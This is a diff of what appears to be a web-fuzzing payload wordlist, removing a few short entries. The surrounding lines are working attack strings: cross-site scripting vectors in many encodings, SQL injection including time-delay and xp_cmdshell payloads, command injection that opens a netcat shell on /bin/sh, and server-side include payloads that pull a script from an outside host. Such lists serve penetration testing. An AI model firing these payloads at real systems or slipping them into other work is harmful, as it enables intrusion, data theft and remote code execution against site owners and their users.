@@ -422,13 +422,11 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
 %2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
 %2c(select%20*%20from%20(select(sleep(10)))a)
-%3C
 %3C%73%63%7
 %3cscript%3ealert('XSS')%3c/script%3e
 %40%40basedir
 %><script>alert(1);</script
 %BCscript%BEalert(%A2XSS%A2)%BC/script%BE
-& id
 & nc -lvvp 4444 -e /bin/sh&
 & ping -i 30 127.0.0.1 &
 & ping -n 30 127.0.0.1 &
@@ -445,7 +443,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 &#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
 &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
 &#39;&#88;&#83;&#83;&#39;&#41;>
-&#60
 &#60&#115&#99&#114&
 &#X000003C
 &#X000003C;
@@ -507,8 +504,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 &&SLEEP(5)--
 &<script>document.vulnerable=true;</script>
 &ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi
-&LT
-&LT;
 &Tab;javascript:prompt
 &a0;&a0;&a0
 &a1;&a1;&a1;&a1
@@ -523,8 +518,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 &lol5;&lol5
 &lol6;&lol6
 &lol;&lol
-&lt
-&lt;
 &lt;!&#91;endif&#93;--&gt;
 &lt;!--#exec cmd=&quot;/bin/echo &apos;&lt;SCRIPT SRC&apos;&quot;--&gt;&lt;!--#exec cmd=&quot;/bin/echo &apos;=http://ha.ckers.org/xss.js&gt;&lt;/SCRIPT&gt;&apos;&quot;--&gt;
 &lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\"--&gt;
@@ -1436,7 +1429,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 ; exec master..xp_cmdshell 'ping 172.10.1.255'--
 ; exec xp_regread
 ; execute immediate 'sel' || 'ect us' || 'er'
-; id
 ; nc -lvvp 4444 -e /bin/sh;
 ; or '1'='1'
 ;%20begin%20declare%20@var%20varchar(8000)%20set%20@var='%20...
@@ -1592,7 +1584,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 </br style=a:expression(alert())>
 </br%20style=a:expression(alert())>
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
-</html>
 </noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
 </noscript><br><code%20onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE%20MOUSE%20OVER%20THIS%20AREA</code>
 </plaintext\></|\><plaintext/onmouseover=prompt(1)
